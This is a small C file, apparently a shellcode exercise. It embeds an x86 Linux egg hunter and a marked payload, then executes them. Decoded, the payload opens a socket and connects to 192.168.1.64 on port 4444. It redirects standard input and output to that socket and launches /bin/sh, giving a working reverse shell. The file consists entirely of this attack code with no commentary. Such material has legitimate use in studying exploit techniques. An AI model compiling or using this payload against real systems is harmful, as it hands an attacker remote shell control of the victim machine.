#include<stdio.h>
#include<string.h>

#define EGG "\x90\x50\x90\x50"

unsigned char egg_hunter[] = \
"\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x90\x50\x90\x50\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";

unsigned char code[] = 
EGG
EGG 
"\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc6\x31\xc9\x68\xc0\xa8\x01\x40\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xb0\x66\xb3\x03\xcd\x80\x89\xf3\x31\xc9\xb0\x3f\xcd\x80\x41\x83\xf9\x02\x7e\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

	printf("Egg hunter Length: %d\n", strlen(egg_hunter));
	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())egg_hunter;

	ret();

}